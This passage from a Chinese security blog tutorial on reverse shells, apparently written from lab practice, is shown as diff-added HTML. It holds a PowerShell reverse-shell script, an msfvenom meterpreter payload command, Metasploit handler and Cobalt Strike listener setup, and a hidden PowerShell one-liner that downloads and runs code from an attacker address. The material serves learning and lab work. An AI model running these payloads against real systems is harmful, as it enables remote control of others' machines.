class="hljs-variable">$null</span>);<span class="hljs-variable">$esread</span>=<span class="hljs-variable">$es</span>.BaseStream.BeginRead(<span class="hljs-variable">$eb</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$eb</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);<span class="hljs-variable">$c</span>.connect(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<span class="hljs-variable">$s</span>=<span class="hljs-variable">$c</span>.GetStream();<span class="hljs-keyword">while</span> (<span class="hljs-variable">$true</span>) &#123;<span class="hljs-built_in">start-sleep</span> <span class="hljs-literal">-m</span> <span class="hljs-number">100</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$osread</span>.IsCompleted <span class="hljs-operator">-and</span> <span class="hljs-variable">$osread</span>.Result <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) &#123;<span class="hljs-variable">$r</span>=<span class="hljs-variable">$os</span>.BaseStream.EndRead(<span class="hljs-variable">$osread</span>);<span class="hljs-variable">$s</span>.Write(<span class="hljs-variable">$ob</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$r</span>);<span class="hljs-variable">$s</span>.Flush();<span class="hljs-variable">$osread</span>=<span class="hljs-variable">$os</span>.BaseStream.BeginRead(<span class="hljs-variable">$ob</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ob</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$esread</span>.IsCompleted <span class="hljs-operator">-and</span> <span class="hljs-variable">$esread</span>.Result <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) &#123;<span class="hljs-variable">$r</span>=<span class="hljs-variable">$es</span>.BaseStream.EndRead(<span class="hljs-variable">$esread</span>);<span class="hljs-variable">$s</span>.Write(<span class="hljs-variable">$eb</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$r</span>);<span class="hljs-variable">$s</span>.Flush();<span class="hljs-variable">$esread</span>=<span class="hljs-variable">$es</span>.BaseStream.BeginRead(<span class="hljs-variable">$eb</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$eb</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$s</span>.DataAvailable) &#123;<span class="hljs-variable">$r</span>=<span class="hljs-variable">$s</span>.Read(<span class="hljs-variable">$nb</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$nb</span>.Length);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$r</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">1</span>) &#123;<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$str</span>=<span class="hljs-variable">$e</span>.GetString(<span class="hljs-variable">$nb</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$r</span>);<span class="hljs-variable">$is</span>.write(<span class="hljs-variable">$str</span>);&#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$c</span>.Connected <span class="hljs-operator">-ne</span> <span class="hljs-variable">$true</span> <span class="hljs-operator">-or</span> (<span class="hljs-variable">$c</span>.Client.Poll(<span class="hljs-number">1</span>,[<span class="hljs-type">System.Net.Sockets.SelectMode</span>]::SelectRead) <span class="hljs-operator">-and</span> <span class="hljs-variable">$c</span>.Client.Available <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>))&#123;<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>.ExitCode <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span>)&#123;<span class="hljs-keyword">break</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>靶机执行使用powershell执行payload，这里我一直闪退，也找不出什么原因，或许是这种方法被我的靶机识别了吧，这里采用一个生成exe文件的方式来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=8888 -f exe -o payload.exe<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917164337841.png'><img src="image-20230917164337841.png" alt="image-20230917164337841"></p>
+<p>复制payload.exe到Windows机器，然后kali下开启msf使用如下命令监听8888端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs linux">msfconsole    //启动msf<br><br>use exploit/multi/handler          //使用msf的侦听模块exploit/multi/handler<br><br>set PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload<br> <br>set LHOST 192.168.153.176               //设置本地监听机Ip<br><br>set LPORT  4444              //设置监听端口<br>     <br>exploit<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917165804971.png'><img src="image-20230917165804971.png" alt="image-20230917165804971"></p>
+<p>设置完，在靶机上执行exe即可监听 成功</p>
+<p class='item-img' data-src='image-20230917165828215.png'><img src="image-20230917165828215.png" alt="image-20230917165828215"></p>
+<p class='item-img' data-src='image-20230917165841402.png'><img src="image-20230917165841402.png" alt="image-20230917165841402"></p>
+<h3 id="6-Cobalt-strike反弹shell"><a href="#6-Cobalt-strike反弹shell" class="headerlink" title="6-Cobalt-strike反弹shell"></a>6. Cobalt strike反弹shell</h3>
+<p>Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块</p>
+<p>运行服务端</p>
+<p><code>./teamserver 192.168.17.137 123 #123为连接密码</code></p>
+<p class='item-img' data-src='image-20230917172953749.png'><img src="image-20230917172953749.png" alt="image-20230917172953749"></p>
+<p>运行客户端：</p>
+<p>Windows运行cobaltstrike.jar #用户名随便输入 密码123</p>
+<p class='item-img' data-src='image-20230917173049098.png'><img src="image-20230917173049098.png" alt="image-20230917173049098"></p>
+<p>开启监听:</p>
+<p>点击Cobalt Strike-&gt;Listeners</p>
+<p>payload可选择windows/beacon_http/reverse_http</p>
+<p>说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。</p>
+<p class='item-img' data-src='image-20230917173459042.png'><img src="image-20230917173459042.png" alt="image-20230917173459042"></p>
+<p>这里name随便，ip写服务器端，端口自定义</p>
+<p>生成powershell payload:</p>
+<p>点击Attack -&gt;Scripted Web Delivery</p>
+<p>Type选择 powershell</p>
+<p class='item-img' data-src='image-20230917173738085.png'><img src="image-20230917173738085.png" alt="image-20230917173738085"></p>
+<p class='item-img' data-src='image-20230917173809592.png'><img src="image-20230917173809592.png" alt="image-20230917173809592"></p>
+<p>payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.17.137:5566/a&#x27;))&quot;<br></code></pre></td></tr></table></figure>
+<p>生成代码已经给出了，在windows上执行</p>
+<p class='item-img' data-src='image-20230917174044292.png'><img src="image-20230917174044292.png" alt="image-20230917174044292"></p>
+<p>我是在上图位置执行的，不知道其他地方行不行。</p>
+<p class='item-img' data-src='image-20230917174124568.png'><img src="image-20230917174124568.png" alt="image-20230917174124568"></p>
+<p>不过看见同一电脑上线两次，估计cmd里面执行也可</p>
+<p class='item-img' data-src='image-20230917174350601.png'><img src="image-20230917174350601.png" alt="image-20230917174350601"></p>
+<p>右键点击interact进入shell，这里ipconfig等命令无法执行，应该是提权才能执行吧，这里不深入了</p>
+<p>这次写的反弹shell只是想有一个总体的了解，过程坎坷，不过我们不应该因为步骤复杂或者遇到困难而妥协，在过程中遇到问题解决问题同样可以学到东西。本次文章也有欠缺，不够完美，后续深入学习在继续更新吧。</p>
+<p>等等，有强迫症的我，了解了一下为何上述命令无法执行，因为某些命令只是cs自带的，那么ipconfig这种cs就没有，我们需要在前面加入shell即可执行</p>
+<p class='item-img' data-src='image-20230917175205836.png'><img src="image-20230917175205836.png" alt="image-20230917175205836"></p>
+<h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37638874/article/details/126723963?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169491442916800227425621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169491442916800227425621&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-126723963-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=kali%E5%A6%82%E6%B2%A1%E6%9C%89%2Fdev%2Ftcp%E6%96%87%E4%BB%B6%E5%A4%B9&amp;spm=1018.2226.3001.4187">反弹shell bash -i命令</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43199509/article/details/120028288?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169491448416800215020886%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169491448416800215020886&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-120028288-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=kali%E6%B2%A1%E6%9C%89%2Fdev%2Ftcp%E6%96%87%E4%BB%B6%E5%A4%B9&amp;spm=1018.2226.3001.4187">反弹shell失败 原来是这个原因</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/247967.html">反弹shell的方法总结</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zl1991/p/12524924.html">通过shell终端直接打开socket文件进行TCP、UDP通信（转）</a>](<a target="_blank" rel="noopener" href="https://cnblogs.com/zl1991/p/12524924.html">https://cnblogs.com/zl1991/p/12524924.html</a>)</p>
+<p><a target="_blank" rel="noopener" href="https://hacked.cool/archives/194/">Linux 反弹 shell 学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46450747/article/details/127386222?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169492137916800215044175%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169492137916800215044175&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-127386222-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=linux%E5%A6%82%E4%BD%95%E5%88%87%E6%8D%A2%20shell%E7%8E%AF%E5%A2%83&amp;spm=1018.2226.3001.4187">Kali linux zsh shell切换bash shell</a></p>
+<p>上面2-6的文章均为解决/dev/tcp找不到的方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4eaad2163567">PowerShell：因为在此系统上禁止运行脚本，解决方法</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_16179749/6632568"><strong>内网隧道代理技术（六）之 PowerCat反弹Shell</strong></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aixioxiaoxaio/article/details/110919867">msf反弹shell</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/16/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">Apache HTTPD 多后缀解析漏洞 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.</span> <span class="toc-text">1. 什么是反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8F%8D%E5%BC%B9shell%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">2. 为什么需要反弹shell？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">二、反弹shell命令解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">1. 命令解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">2. 文件描述符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.3.</span> <span class="toc-text">3. 输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.4.</span> <span class="toc-text">4. 输入重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text">三、linux下反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-bash%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.1.</span> <span class="toc-text">1. bash反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.2.</span> <span class="toc-text">2. nc反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-curl%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.3.</span> <span class="toc-text">3. curl反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-whois%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.4.</span> <span class="toc-text">4. whois反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-python%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.5.</span> <span class="toc-text">5. python反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-PHP%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.6.</span> <span class="toc-text">6. PHP反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-ruby%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.7.</span> <span class="toc-text">7. ruby反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-socat%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.8.</span> <span class="toc-text">8. socat反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Perl%E5%8F%8D%E5%BC%B9"><span class="toc-number">3.9.</span> <span class="toc-text">9. Perl反弹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Windows%E4%B8%8B%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.</span> <span class="toc-text">四、Windows下反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-powercat%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.1.</span> <span class="toc-text">1. powercat反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-NC%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.2.</span> <span class="toc-text">2. NC反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-nishang%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.3.</span> <span class="toc-text">3. nishang反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Reverse-UDP-shell"><span class="toc-number">4.4.</span> <span class="toc-text">4. Reverse UDP shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-MSF%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.5.</span> <span class="toc-text">5. MSF反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Cobalt-strike%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.6.</span> <span class="toc-text">6. Cobalt strike反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">五、参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
